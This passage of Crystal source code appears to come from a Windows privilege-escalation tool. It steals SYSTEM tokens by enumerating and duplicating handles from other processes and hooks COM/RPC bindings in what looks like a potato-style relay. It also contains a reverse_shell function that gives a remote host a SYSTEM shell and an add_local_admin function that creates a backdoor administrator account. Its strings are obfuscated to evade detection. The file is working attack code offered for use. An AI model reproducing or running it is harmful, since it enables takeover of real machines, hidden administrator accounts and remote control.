  TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID

PROCESS_QUERY_INFORMATION         = 0x0400_u32
PROCESS_QUERY_LIMITED_INFORMATION = 0x1000_u32
PROCESS_DUP_HANDLE                = 0x0040_u32

SYSTEM_EXTENDED_HANDLE_INFORMATION = 0x40_u32
STATUS_INFO_LENGTH_MISMATCH        = 0xC0000004_u32
STATUS_SUCCESS                     = 0x00000000_u32
DUPLICATE_SAME_ACCESS              = 0x00000002_u32

STARTF_USESTDHANDLES      = 0x00000100_u32
CREATE_NO_WINDOW          = 0x08000000_u32
CREATE_UNICODE_ENVIRONMENT = 0x00000400_u32
HANDLE_FLAG_INHERIT       = 0x00000001_u32

AF_INET        = 2_i32
SOCK_STREAM    = 1_i32
IPPROTO_TCP    = 6_i32
FIONBIO        = 0x8004667E_u32
INVALID_SOCKET = ~0_u64

SECURITY_IMPERSONATION  = 2_i32
TOKEN_PRIMARY           = 1_i32
TOKEN_IMPERSONATION_TYPE = 2_i32

TOKEN_USER_CLASS             = 1_i32
TOKEN_IMPERSONATION_LV_CLASS = 9_i32
TOKEN_INTEGRITY_LEVEL_CLASS  = 25_i32

OBJREF_SIGNATURE = 0x574f454d_u32
OBJREF_STANDARD  = 0x01_u32
EPM_PROTOCOL_TCP = 0x07_u16

IID_IUNKNOWN = Bytes[
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,
]

ORCB_GUID_BYTES = Bytes[
  0x70, 0x07, 0xf7, 0x18, 0x64, 0x8e, 0xcf, 0x11,
  0x9a, 0xf1, 0x00, 0x20, 0xaf, 0x6e, 0x72, 0xf4,
]


# ─────────────── NT Structs for syscalls ────────────────
struct ObjectAttributesSC
  property length : UInt32 = 48_u32
  property _pad1 : UInt32 = 0_u32
  property root_directory : Pointer(Void) = Pointer(Void).null
  property object_name : Pointer(Void) = Pointer(Void).null
  property attributes : UInt32 = 0_u32
  property _pad2 : UInt32 = 0_u32
  property security_descriptor : Pointer(Void) = Pointer(Void).null
  property security_qos : Pointer(Void) = Pointer(Void).null

  def initialize
  end
end

struct ClientIdSC
  property unique_process : UInt64 = 0_u64
  property unique_thread : UInt64 = 0_u64

  def initialize(@unique_process = 0_u64, @unique_thread = 0_u64)
  end
end


# ─────────────── Structs ────────────────────────────────
struct SecurityAttributesCR
  property n_length : UInt32 = 0_u32
  property lp_security_descriptor : Pointer(Void) = Pointer(Void).null
  property b_inherit_handle : Int32 = 0_i32

  def initialize(@n_length = 0_u32, @lp_security_descriptor = Pointer(Void).null, @b_inherit_handle = 0_i32)
  end
end

struct Wg
  property data1 : UInt32 = 0_u32
  property data2 : UInt16 = 0_u16
  property data3 : UInt16 = 0_u16
  property data4 : StaticArray(UInt8, 8) = StaticArray(UInt8, 8).new(0_u8)

  def initialize
  end
end

struct Rv
  property major : UInt16 = 0_u16
  property minor : UInt16 = 0_u16

  def initialize
  end
end

struct Rs
  property syntax_guid : Wg = Wg.new
  property syntax_version : Rv = Rv.new

  def initialize
  end
end

struct Ri
  property length : UInt32 = 0_u32
  property interface_id : Rs = Rs.new
  property transfer_syntax : Rs = Rs.new
  property dispatch_table : Pointer(Void) = Pointer(Void).null
  property rpc_protseq_endpoint_count : UInt32 = 0_u32
  property rpc_protseq_endpoint : Pointer(Void) = Pointer(Void).null
  property default_manager_epv : Pointer(Void) = Pointer(Void).null
  property interpreter_info : Pointer(Void) = Pointer(Void).null
  property flags : UInt32 = 0_u32

  def initialize
  end
end

struct Rd
  property dispatch_table_count : UInt32 = 0_u32
  property dispatch_table : Pointer(Void) = Pointer(Void).null
  property reserved : Int64 = 0_i64

  def initialize
  end
end

struct Mi
  property p_stub_desc : Pointer(Void) = Pointer(Void).null
  property dispatch_table : Pointer(Void) = Pointer(Void).null
  property proc_string : Pointer(Void) = Pointer(Void).null
  property fmt_string_offset : Pointer(Void) = Pointer(Void).null
  property thunk_table : Pointer(Void) = Pointer(Void).null
  property p_transfer_syntax : Pointer(Void) = Pointer(Void).null
  property n_count : Pointer(Void) = Pointer(Void).null
  property p_syntax_info : Pointer(Void) = Pointer(Void).null

  def initialize
  end
end

struct StartupInfoW
  property cb : UInt32 = 0_u32
  property lp_reserved : Pointer(Void) = Pointer(Void).null
  property lp_desktop : Pointer(UInt16) = Pointer(UInt16).null
  property lp_title : Pointer(UInt16) = Pointer(UInt16).null
  property dw_x : UInt32 = 0_u32
  property dw_y : UInt32 = 0_u32
  property dw_x_size : UInt32 = 0_u32
  property dw_y_size : UInt32 = 0_u32
  property dw_x_count_chars : UInt32 = 0_u32
  property dw_y_count_chars : UInt32 = 0_u32
  property dw_fill_attribute : UInt32 = 0_u32
  property dw_flags : UInt32 = 0_u32
  property w_show_window : UInt16 = 0_u16
  property cb_reserved2 : UInt16 = 0_u16
  property lp_reserved2 : Pointer(Void) = Pointer(Void).null
  property h_std_input : Pointer(Void) = Pointer(Void).null
  property h_std_output : Pointer(Void) = Pointer(Void).null
  property h_std_error : Pointer(Void) = Pointer(Void).null

  def initialize
    @cb = sizeof(StartupInfoW).to_u32
  end
end

struct ProcessInformationCR
  property h_process : Pointer(Void) = Pointer(Void).null
  property h_thread : Pointer(Void) = Pointer(Void).null
  property dw_process_id : UInt32 = 0_u32
  property dw_thread_id : UInt32 = 0_u32

  def initialize
  end
end

struct SockAddrIn
  property sin_family : UInt16 = 0_u16
  property sin_port : UInt16 = 0_u16
  property sin_addr : UInt32 = 0_u32
  property sin_zero : StaticArray(UInt8, 8) = StaticArray(UInt8, 8).new(0_u8)

  def initialize
  end
end

struct FdSetCR
  property fd_count : UInt32 = 0_u32
  property _pad : UInt32 = 0_u32
  property fd_array : StaticArray(UInt64, 64) = StaticArray(UInt64, 64).new(0_u64)

  def initialize
  end
end

struct TvCR
  property tv_sec : Int32 = 0_i32
  property tv_usec : Int32 = 0_i32

  def initialize(@tv_sec = 0_i32, @tv_usec = 0_i32)
  end
end

@[Packed]
struct He
  property object_pointer : UInt64 = 0_u64
  property process_id : UInt64 = 0_u64
  property handle_value : UInt64 = 0_u64
  property granted_access : UInt32 = 0_u32
  property creator_back_track_index : UInt16 = 0_u16
  property object_type : UInt16 = 0_u16
  property handle_attributes : UInt32 = 0_u32
  property reserved : UInt32 = 0_u32

  def initialize
  end
end


# ─────────────── OBJREF ─────────────────────────────────
struct SecurityBinding
  property authn_svc : UInt16
  property authz_svc : UInt16

  def initialize(@authn_svc : UInt16, @authz_svc : UInt16)
  end

  def get_bytes : Bytes
    io = IO::Memory.new
    io.write_bytes(@authn_svc, IO::ByteFormat::LittleEndian)
    io.write_bytes(@authz_svc, IO::ByteFormat::LittleEndian)
    io.write(Bytes[0, 0, 0, 0])
    io.to_slice
  end
end

struct StringBinding
  property tower_id : UInt16
  property network_address : String

  def initialize(@tower_id : UInt16, @network_address : String)
  end

  def get_bytes : Bytes
    io = IO::Memory.new
    io.write_bytes(@tower_id, IO::ByteFormat::LittleEndian)
    @network_address.each_char do |c|
      io.write_bytes(c.ord.to_u16, IO::ByteFormat::LittleEndian)
    end
    io.write(Bytes[0, 0, 0, 0])
    io.to_slice
  end
end

struct DualStringArray
  property string_binding : StringBinding
  property security_binding : SecurityBinding

  def initialize(@string_binding : StringBinding, @security_binding : SecurityBinding)
  end

  def get_bytes : Bytes
    sb = @string_binding.get_bytes
    sec = @security_binding.get_bytes
    num_entries = (sb.size + sec.size) // 2
    sec_offset = sb.size // 2
    io = IO::Memory.new
    io.write_bytes(num_entries.to_u16, IO::ByteFormat::LittleEndian)
    io.write_bytes(sec_offset.to_u16, IO::ByteFormat::LittleEndian)
    io.write(sb)
    io.write(sec)
    io.to_slice
  end
end

class StandardObjRef
  getter flags : UInt32
  getter public_refs : UInt32
  getter oxid : UInt64
  getter oid : UInt64
  getter ipid : Bytes

  def initialize(@flags : UInt32, @public_refs : UInt32, @oxid : UInt64, @oid : UInt64, @ipid : Bytes)
  end

  def get_bytes(dsa : DualStringArray?) : Bytes
    io = IO::Memory.new
    io.write_bytes(@flags, IO::ByteFormat::LittleEndian)
    io.write_bytes(@public_refs, IO::ByteFormat::LittleEndian)
    io.write_bytes(@oxid, IO::ByteFormat::LittleEndian)
    io.write_bytes(@oid, IO::ByteFormat::LittleEndian)
    io.write(@ipid)
    if d = dsa
      io.write(d.get_bytes)
    end
    io.to_slice
  end
end

class ObjRef
  getter guid : Bytes
  getter standard_objref : StandardObjRef

  def initialize(@guid : Bytes, @standard_objref : StandardObjRef)
  end

  def self.parse(data : Bytes) : ObjRef
    io = IO::Memory.new(data)
    sig = io.read_bytes(UInt32, IO::ByteFormat::LittleEndian)
    raise obf("bad sig 0x") + sig.to_s(16) unless sig == OBJREF_SIGNATURE
    flags = io.read_bytes(UInt32, IO::ByteFormat::LittleEndian)
    guid = Bytes.new(16)
    io.read_fully(guid)
    std_flags = io.read_bytes(UInt32, IO::ByteFormat::LittleEndian)
    pub_refs = io.read_bytes(UInt32, IO::ByteFormat::LittleEndian)
    oxid = io.read_bytes(UInt64, IO::ByteFormat::LittleEndian)
    oid = io.read_bytes(UInt64, IO::ByteFormat::LittleEndian)
    ipid = Bytes.new(16)
    io.read_fully(ipid)
    ObjRef.new(guid, StandardObjRef.new(std_flags, pub_refs, oxid, oid, ipid))
  end

  def get_bytes(dsa : DualStringArray) : Bytes
    io = IO::Memory.new
    io.write_bytes(OBJREF_SIGNATURE, IO::ByteFormat::LittleEndian)
    io.write_bytes(OBJREF_STANDARD, IO::ByteFormat::LittleEndian)
    io.write(@guid)
    io.write(@standard_objref.get_bytes(dsa))
    io.to_slice
  end
end


# ─────────────── Helpers ────────────────────────────────
def sunday_search(text : Bytes, pattern : Bytes) : Array(Int32)
  table = StaticArray(Int32, 512).new(-1)
  pattern.each_with_index { |b, i| table[b] = i }

  results = [] of Int32
  i = 0
  plen = pattern.size
  tlen = text.size

  while i <= tlen - plen
    j = 0
    while j < plen && text[i + j] == pattern[j]
      j += 1
    end
    results << i if j == plen
    i += plen
    if i < tlen
      i -= table[text[i]]
    end
  end

  results
end

def read_wide_string(ptr : Pointer(UInt16)) : String
  return "" if ptr.null?
  String.build do |s|
    i = 0
    loop do
      ch = ptr[i]
      break if ch == 0
      s << ch.unsafe_chr
      i += 1
    end
  end
end

def sid_to_string(sid : Pointer(Void)) : String?
  return nil if sid.null?
  ptr = sid.as(Pointer(UInt8))
  revision = ptr[0]
  sub_count = ptr[1]
  return nil if sub_count == 0

  auth_bytes = ptr + 2
  authority = (auth_bytes[0].to_u64 << 40) | (auth_bytes[1].to_u64 << 32) |
              (auth_bytes[2].to_u64 << 24) | (auth_bytes[3].to_u64 << 16) |
              (auth_bytes[4].to_u64 << 8) | auth_bytes[5].to_u64

  String.build do |s|
    s << "S-" << revision << "-" << authority
    sub_base = (ptr + 8).as(Pointer(UInt32))
    sub_count.times do |i|
      s << "-" << sub_base[i]
    end
  end
end

def get_token_sid(token : Pointer(Void)) : String?
  buf_len = 0_u32
  s1 = SysState.nt_query_information_token(token, TOKEN_USER_CLASS.to_u32,
    Pointer(Void).null, 0_u32, pointerof(buf_len))
  dbg obf("[sid] probe status=0x") + s1.unsafe_as(UInt32).to_s(16) + " buf_len=" + buf_len.to_s
  return nil if buf_len == 0

  buf = Bytes.new(buf_len)
  status = SysState.nt_query_information_token(token, TOKEN_USER_CLASS.to_u32,
    buf.to_unsafe.as(Pointer(Void)), buf_len, pointerof(buf_len))
  dbg obf("[sid] query status=0x") + status.unsafe_as(UInt32).to_s(16)
  return nil if status < 0

  sid_ptr = Pointer(Pointer(Void)).new(buf.to_unsafe.address).value
  dbg obf("[sid] sid_ptr=0x") + sid_ptr.address.to_s(16)
  result = sid_to_string(sid_ptr)
  dbg obf("[sid] result=") + (result || "nil")
  result
end

def get_integrity_level(token : Pointer(Void)) : UInt32
  buf_len = 0_u32
  SysState.nt_query_information_token(token, TOKEN_INTEGRITY_LEVEL_CLASS.to_u32,
    Pointer(Void).null, 0_u32, pointerof(buf_len))
  return 0_u32 if buf_len == 0

  buf = Bytes.new(buf_len)
  status = SysState.nt_query_information_token(token, TOKEN_INTEGRITY_LEVEL_CLASS.to_u32,
    buf.to_unsafe.as(Pointer(Void)), buf_len, pointerof(buf_len))
  return 0_u32 if status < 0

  sid_ptr = Pointer(Pointer(Void)).new(buf.to_unsafe.address).value
  return 0_u32 if sid_ptr.null?

  ptr = sid_ptr.as(Pointer(UInt8))
  sub_count = ptr[1]
  return 0_u32 if sub_count == 0
  sub_base = (ptr + 8).as(Pointer(UInt32))
  sub_base[sub_count.to_i32 - 1]
end

def get_impersonation_level(token : Pointer(Void)) : Int32
  level = 0_u32
  buf_len = sizeof(UInt32).to_u32
  status = SysState.nt_query_information_token(token, TOKEN_IMPERSONATION_LV_CLASS.to_u32,
    pointerof(level).as(Pointer(Void)), buf_len, pointerof(buf_len))
  return level.to_i32 if status >= 0
  -1
end

def query_system_handles : {Pointer(Void), UInt32}?
  buf_size = 1024_u32 * 1024
  buf = Pointer(UInt8).malloc(buf_size).as(Pointer(Void))
  ret_len = 0_u32

  status = SysState.nt_query_system_information(
    SYSTEM_EXTENDED_HANDLE_INFORMATION, buf, buf_size, pointerof(ret_len))
  dbg obf("[qsh] initial status=0x") + status.to_s(16) + " ret_len=" + ret_len.to_s + " buf_size=" + buf_size.to_s
  while status == STATUS_INFO_LENGTH_MISMATCH
    buf_size *= 2
    buf = Pointer(UInt8).malloc(buf_size).as(Pointer(Void))
    status = SysState.nt_query_system_information(
      SYSTEM_EXTENDED_HANDLE_INFORMATION, buf, buf_size, pointerof(ret_len))
    dbg obf("[qsh] retry status=0x") + status.to_s(16) + " ret_len=" + ret_len.to_s + " buf_size=" + buf_size.to_s
  end

  if status != STATUS_SUCCESS
    dbg obf("[qsh] FAILED status=0x") + status.to_s(16)
    return nil
  end
  dbg obf("[qsh] OK handles_buf_size=") + ret_len.to_s
  {buf, ret_len}
end

def detect_token_object_type : Int32
  my_token = Pointer(Void).null
  status = SysState.nt_open_thread_token(CURRENT_THREAD, TOKEN_QUERY, 1, pointerof(my_token))
  dbg obf("[dtot] thread_token status=0x") + status.unsafe_as(UInt32).to_s(16) + " tok=0x" + my_token.address.to_s(16)
  if status < 0 || my_token.null?
    status = SysState.nt_open_process_token(CURRENT_PROCESS, TOKEN_QUERY, pointerof(my_token))
    dbg obf("[dtot] proc_token status=0x") + status.unsafe_as(UInt32).to_s(16) + " tok=0x" + my_token.address.to_s(16)
  end
  if my_token.null?
    dbg obf("[dtot] no token")
    return -1
  end

  my_pid = PEWalk.get_current_pid.to_u64
  dbg obf("[dtot] pid=") + my_pid.to_s + " token_handle=0x" + my_token.address.to_s(16)

  result = query_system_handles
  unless result
    dbg obf("[dtot] query_system_handles FAILED")
    SysState.nt_close(my_token)
    return -1
  end
  buf, _ = result

  num_handles = Pointer(UInt64).new(buf.address).value
  entry_offset = sizeof(UInt64) * 2
  entry_size = sizeof(He)
  dbg obf("[dtot] num_handles=") + num_handles.to_s + " entry_size=" + entry_size.to_s

  token_type = -1_i32
  pid_matches = 0
  first_pid_entry_dumped = false
  num_handles.times do |i|
    addr = buf.address + entry_offset + i * entry_size
    entry = Pointer(He).new(addr).value
    if entry.process_id == my_pid
      pid_matches += 1
      unless first_pid_entry_dumped
        dbg obf("[dtot] sample pid_entry: hv=0x") + entry.handle_value.to_s(16) +
            " ot=" + entry.object_type.to_s + " ga=0x" + entry.granted_access.to_s(16)
        first_pid_entry_dumped = true
      end
      if entry.handle_value == my_token.address.to_u64
        token_type = entry.object_type.to_i32
        dbg obf("[dtot] FOUND type=") + token_type.to_s + " at i=" + i.to_s
        break
      end
    end
  end

  dbg obf("[dtot] pid_matches=") + pid_matches.to_s
  SysState.nt_close(my_token)
  dbg obf("[dtot] result=") + token_type.to_s
  token_type
end

def find_system_token(log : Array(String)? = nil) : Pointer(Void)?
  log.try &.<< obf("[*] searching")

  token_type = detect_token_object_type
  if token_type < 0
    dbg obf("[fst] detect failed, fallback type=5")
    token_type = 5
  end

  result = query_system_handles
  unless result
    log.try &.<< obf("[-] not found")
    return nil
  end
  buf, _ = result

  num_handles = Pointer(UInt64).new(buf.address).value
  entry_offset = sizeof(UInt64) * 2
  entry_size = sizeof(He)

  last_pid = 0_u64
  proc_handle = Pointer(Void).null
  found_token : Pointer(Void)? = nil
  system_sid = obf("S-1-5-18")

  oa = ObjectAttributesSC.new
  my_pid = PEWalk.get_current_pid.to_u64

  token_matches = 0
  dup_ok = 0
  sid_system = 0
  proc_open_fail = 0

  dbg obf("[fst] using token_type=") + token_type.to_s + " num_handles=" + num_handles.to_s

  num_handles.times do |i|
    addr = buf.address + entry_offset + i * entry_size
    entry = Pointer(He).new(addr).value

    next if entry.object_type.to_i32 != token_type
    next if entry.granted_access == 0x0012019f_u32
    token_matches += 1

    h_pid = entry.process_id
    if h_pid != last_pid
      SysState.nt_close(proc_handle) unless proc_handle.null?
      proc_handle = Pointer(Void).null

      cid = ClientIdSC.new(h_pid)
      SysState.nt_open_process(pointerof(proc_handle),
        PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION,
        pointerof(oa).as(Pointer(Void)), pointerof(cid).as(Pointer(Void)))

      if proc_handle.null?
        SysState.nt_open_process(pointerof(proc_handle),
          PROCESS_DUP_HANDLE | PROCESS_QUERY_LIMITED_INFORMATION,
          pointerof(oa).as(Pointer(Void)), pointerof(cid).as(Pointer(Void)))
      end
      last_pid = h_pid
    end

    if proc_handle.null?
      proc_open_fail += 1
      next
    end

    dup_token = Pointer(Void).null
    status = SysState.nt_duplicate_object(
      proc_handle, Pointer(Void).new(entry.handle_value),
      CURRENT_PROCESS, pointerof(dup_token),
      0_u32, 0_u32, DUPLICATE_SAME_ACCESS)
    if status < 0
      next
    end
    dup_ok += 1

    sid = get_token_sid(dup_token)
    dbg obf("[fst] dup#") + dup_ok.to_s + " pid=" + h_pid.to_s + " sid=" + (sid || "nil") if dup_ok <= 5
    if sid == system_sid
      sid_system += 1
    else
      SysState.nt_close(dup_token)
      next
    end

    imp_level = get_impersonation_level(dup_token)
    integrity = get_integrity_level(dup_token)
    dbg obf("[fst] SYSTEM pid=") + h_pid.to_s + " il=" + imp_level.to_s + " integ=0x" + integrity.to_s(16)

    if imp_level >= 2 && integrity >= 0x4000
      new_token = Pointer(Void).null
      dup_oa = ObjectAttributesSC.new
      status = SysState.nt_duplicate_token(
        dup_token, TOKEN_ELEVATION,
        pointerof(dup_oa).as(Pointer(Void)),
        SECURITY_IMPERSONATION.to_u32, TOKEN_IMPERSONATION_TYPE.to_u32,
        pointerof(new_token))
      dbg obf("[fst] dup_token status=0x") + status.unsafe_as(UInt32).to_s(16) + " new=0x" + new_token.address.to_s(16)
      if status >= 0
        log.try { |l| l << obf("[*] P:") + h_pid.to_s + obf(" H:0x") + entry.handle_value.to_s(16) + obf(" OK") }
        SysState.nt_close(dup_token)
        found_token = new_token
        break
      end
    end

    SysState.nt_close(dup_token)
  end

  SysState.nt_close(proc_handle) unless proc_handle.null?

  dbg obf("[fst] token_matches=") + token_matches.to_s + " dup_ok=" + dup_ok.to_s + " sid_system=" + sid_system.to_s + " proc_fail=" + proc_open_fail.to_s
  unless found_token
    log.try &.<< obf("[-] not found")
  end
  found_token
end


# ─────────────── Process Creation ───────────────────────
def create_process_read_output(token_handle : Pointer(Void), command_line : String)
  sa = SecurityAttributesCR.new(sizeof(SecurityAttributesCR).to_u32, Pointer(Void).null, 1)

  stdout_read = Pointer(Void).null
  stdout_write = Pointer(Void).null
  if WinExtra.CreatePipe(pointerof(stdout_read), pointerof(stdout_write),
      pointerof(sa).as(Pointer(Void)), 4096_u32) == 0
    dbg obf("[!] pipe err:") + LibC.GetLastError.to_s
    return
  end

  WinExtra.SetHandleInformation(stdout_read, HANDLE_FLAG_INHERIT, 0_u32)
  WinExtra.SetHandleInformation(stdout_write, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT)

  primary_token = Pointer(Void).null
  dup_oa = ObjectAttributesSC.new
  has_primary = SysState.nt_duplicate_token(
    token_handle, TOKEN_ELEVATION,
    pointerof(dup_oa).as(Pointer(Void)),
    0_u32, TOKEN_PRIMARY.to_u32,
    pointerof(primary_token)) >= 0
  primary_token = token_handle unless has_primary

  si = StartupInfoW.new
  si.h_std_output = stdout_write
  si.h_std_error = stdout_write
  si.dw_flags = STARTF_USESTDHANDLES

  pi = ProcessInformationCR.new
  cmdline_w = command_line.to_utf16
  created = false

  if SysState.create_process_as_user_w(
      primary_token, Pointer(UInt16).null, cmdline_w.to_unsafe,
      Pointer(Void).null, Pointer(Void).null, 1,
      CREATE_UNICODE_ENVIRONMENT | CREATE_NO_WINDOW, Pointer(Void).null, Pointer(UInt16).null,
      pointerof(si).as(Pointer(Void)), pointerof(pi).as(Pointer(Void))) != 0
    created = true
    dbg obf("[*] via CPAU")
  elsif SysState.create_process_with_token_w(
      primary_token, 0_u32, Pointer(UInt16).null, cmdline_w.to_unsafe,
      CREATE_UNICODE_ENVIRONMENT | CREATE_NO_WINDOW, Pointer(Void).null, Pointer(UInt16).null,
      pointerof(si).as(Pointer(Void)), pointerof(pi).as(Pointer(Void))) != 0
    created = true
    dbg obf("[*] via CPWTW")
  end

  SysState.nt_close(primary_token) if has_primary

  if created
    dbg obf("[*] pid ") + pi.dw_process_id.to_s
    SysState.nt_close(stdout_write)
    stdout_write = Pointer(Void).null

    buf = Bytes.new(4096)
    loop do
      bytes_read = 0_u32
      ret = LibC.ReadFile(stdout_read, buf.to_unsafe.as(Pointer(Void)), 4096_u32,
          pointerof(bytes_read), Pointer(LibC::OVERLAPPED).null)
      if ret == 0
        break
      end
      break if bytes_read == 0
      STDOUT.write(buf[0, bytes_read])
      STDOUT.flush
    end

    timeout = -1_i64
    SysState.nt_wait_for_single_object(pi.h_process, 0, pointerof(timeout).as(Pointer(Void)))
    SysState.nt_close(pi.h_process)
    SysState.nt_close(pi.h_thread)
  else
    dbg obf("[!] exec err:") + LibC.GetLastError.to_s
  end

  SysState.nt_close(stdout_write) unless stdout_write.null?
  SysState.nt_close(stdout_read)
end


# ─────────────── Reverse Shell ─────────────────────────
def reverse_shell(token_handle : Pointer(Void), host : String, port : UInt16, shell : String)
  wsa_data = uninitialized LibC::WSAData
  if LibC.WSAStartup(0x0202_u16, pointerof(wsa_data)) != 0
    dbg1 obf("[!] WSA err")
    return
  end

  sock = LibC.socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
  if sock == INVALID_SOCKET
    dbg1 obf("[!] sock err")
    LibC.WSACleanup
    return
  end

  addr = SockAddrIn.new
  addr.sin_family = AF_INET.to_u16
  addr.sin_port = LibC.htons(port)
  addr.sin_addr = LibC.inet_addr(host.to_unsafe)

  if LibC.connect(sock, pointerof(addr).as(Pointer(LibC::Sockaddr)), sizeof(SockAddrIn)) != 0
    dbg1 obf("[!] conn err")
    LibC.closesocket(sock)
    LibC.WSACleanup
    return
  end

  dbg1 obf("[*] connected")

  nonblocking = 1_u32
  LibC.ioctlsocket(sock, FIONBIO, pointerof(nonblocking))

  sa = SecurityAttributesCR.new(sizeof(SecurityAttributesCR).to_u32, Pointer(Void).null, 1)

  stdin_read = Pointer(Void).null
  stdin_write = Pointer(Void).null
  if WinExtra.CreatePipe(pointerof(stdin_read), pointerof(stdin_write),
      pointerof(sa).as(Pointer(Void)), 4096_u32) == 0
    LibC.closesocket(sock)
    LibC.WSACleanup
    return
  end

  stdout_read = Pointer(Void).null
  stdout_write = Pointer(Void).null
  if WinExtra.CreatePipe(pointerof(stdout_read), pointerof(stdout_write),
      pointerof(sa).as(Pointer(Void)), 4096_u32) == 0
    SysState.nt_close(stdin_read)
    SysState.nt_close(stdin_write)
    LibC.closesocket(sock)
    LibC.WSACleanup
    return
  end

  WinExtra.SetHandleInformation(stdin_read, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT)
  WinExtra.SetHandleInformation(stdin_write, HANDLE_FLAG_INHERIT, 0_u32)
  WinExtra.SetHandleInformation(stdout_write, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT)
  WinExtra.SetHandleInformation(stdout_read, HANDLE_FLAG_INHERIT, 0_u32)

  primary_token = Pointer(Void).null
  dup_oa = ObjectAttributesSC.new
  has_primary = SysState.nt_duplicate_token(
    token_handle, TOKEN_ELEVATION,
    pointerof(dup_oa).as(Pointer(Void)),
    0_u32, TOKEN_PRIMARY.to_u32,
    pointerof(primary_token)) >= 0
  primary_token = token_handle unless has_primary

  si = StartupInfoW.new
  si.h_std_input = stdin_read
  si.h_std_output = stdout_write
  si.h_std_error = stdout_write
  si.dw_flags = STARTF_USESTDHANDLES

  pi = ProcessInformationCR.new
  cmdline_w = shell.to_utf16

  created = false
  if SysState.create_process_as_user_w(
      primary_token, Pointer(UInt16).null, cmdline_w.to_unsafe,
      Pointer(Void).null, Pointer(Void).null, 1,
      CREATE_UNICODE_ENVIRONMENT | CREATE_NO_WINDOW, Pointer(Void).null, Pointer(UInt16).null,
      pointerof(si).as(Pointer(Void)), pointerof(pi).as(Pointer(Void))) != 0
    created = true
    dbg obf("[*] shell via CPAU")
  elsif SysState.create_process_with_token_w(
      primary_token, 0_u32, Pointer(UInt16).null, cmdline_w.to_unsafe,
      CREATE_UNICODE_ENVIRONMENT | CREATE_NO_WINDOW, Pointer(Void).null, Pointer(UInt16).null,
      pointerof(si).as(Pointer(Void)), pointerof(pi).as(Pointer(Void))) != 0
    created = true
    dbg obf("[*] shell via CPWTW")
  end

  SysState.nt_close(primary_token) if has_primary

  unless created
    dbg1 obf("[!] shell err:") + LibC.GetLastError.to_s
    SysState.nt_close(stdin_read)
    SysState.nt_close(stdin_write)
    SysState.nt_close(stdout_read)
    SysState.nt_close(stdout_write)
    LibC.closesocket(sock)
    LibC.WSACleanup
    return
  end

  dbg1 obf("[*] shell pid ") + pi.dw_process_id.to_s

  SysState.nt_close(stdin_read)
  SysState.nt_close(stdout_write)

  buf = Bytes.new(4096)

  loop do
    timeout_zero = 0_i64
    status = SysState.nt_wait_for_single_object(pi.h_process, 0, pointerof(timeout_zero).as(Pointer(Void)))
    break if status == 0

    fd = FdSetCR.new
    fd.fd_count = 1_u32
    fd.fd_array[0] = sock
    tv = TvCR.new(0_i32, 10000_i32)

    sel = LibC.select(0, pointerof(fd).as(Pointer(Void)),
      Pointer(Void).null, Pointer(Void).null, pointerof(tv).as(Pointer(Void)))

    break if sel == -1

    if sel > 0
      bytes_recv = LibC.recv(sock, buf.to_unsafe, 4096_i32, 0)
      if bytes_recv > 0
        bytes_written = 0_u32
        LibC.WriteFile(stdin_write, buf.to_unsafe.as(Pointer(Void)),
          bytes_recv.to_u32, pointerof(bytes_written), Pointer(LibC::OVERLAPPED).null)
      else
        break
      end
    end

    bytes_avail = 0_u32
    WinExtra.PeekNamedPipe(stdout_read, Pointer(Void).null, 0_u32,
      Pointer(UInt32).null, pointerof(bytes_avail), Pointer(UInt32).null)

    if bytes_avail > 0
      bytes_read = 0_u32
      LibC.ReadFile(stdout_read, buf.to_unsafe.as(Pointer(Void)),
        4096_u32, pointerof(bytes_read), Pointer(LibC::OVERLAPPED).null)
      if bytes_read > 0
        total_sent = 0_i32
        while total_sent < bytes_read.to_i32
          sent = LibC.send(sock, buf.to_unsafe + total_sent, bytes_read.to_i32 - total_sent, 0)
          break if sent == -1
          total_sent += sent
        end
      end
    end
  end

  SysState.nt_close(stdin_write)
  SysState.nt_close(stdout_read)
  SysState.nt_close(pi.h_process)
  SysState.nt_close(pi.h_thread)
  LibC.closesocket(sock)
  LibC.WSACleanup
end


# ─────────────── Add Local Admin ───────────────────────
def add_local_admin(token_handle : Pointer(Void), username : String, password : String)
  cmd1 = obf("net user ") + username + " " + password + obf(" /add")
  cmd2 = obf("net localgroup Administrators ") + username + obf(" /add")
  create_process_read_output(token_handle, cmd1)
  create_process_read_output(token_handle, cmd2)
end


# ─────────────── Hook State ─────────────────────────────
module HookState
  @@client_pipe = ""

  def self.client_pipe=(value : String)
    @@client_pipe = value
  end

  def self.hook_impl(pp_bindings : Pointer(Void)) : Int32
    endpoints = [@@client_pipe, obf("ncacn_ip_tcp:0")]
    entries_size = 3
    endpoints.each { |ep| entries_size += ep.size + 1 }

    memory_size = (entries_size * 2 + 10).to_u64
    pdsa = WinExtra.GlobalAlloc(0x0040_u32, memory_size)
    return -1 if pdsa.null?

    base = pdsa.address
    offset = 0_u64
    Pointer(Int16).new(base + offset).value = entries_size.to_i16
    offset += 2
    Pointer(Int16).new(base + offset).value = (entries_size - 2).to_i16
    offset += 2

    endpoints.each do |ep|
      ep.each_char do |ch|
        Pointer(Int16).new(base + offset).value = ch.ord.to_i16
        offset += 2
      end
      offset += 2
    end

    Pointer(Pointer(Void)).new(pp_bindings.address).value = pdsa
    0_i32
  end

  {% for n in (4..14) %}
    def self.hook_func_{{n}}(
      {% for i in 0...n %}p{{i}} : Pointer(Void){% if i < n - 1 %}, {% end %}{% end %}
    ) : Int32
      hook_impl(p{{n - 2}})
    end
  {% end %}

  def self.get_hook_pointer(param_count : UInt32) : Pointer(Void)
    {% begin %}
    case param_count
    {% for n in (4..14) %}
    when {{n}}
      (->({% for i in 0...n %}p{{i}} : Pointer(Void){% if i < n - 1 %}, {% end %}{% end %}) : Int32 {
        HookState.hook_impl(p{{n - 2}})
      }).pointer
    {% end %}
    else
      raise obf("unsupported")
    end
    {% end %}
  end
end


# ─────────────── Pipe Server Thread ─────────────────────
module PipeServerBridge
  @@ctx : MyContext? = nil

  def self.ctx=(value : MyContext?)
    @@ctx = value
  end

  def self.ctx : MyContext?
    @@ctx
  end
end

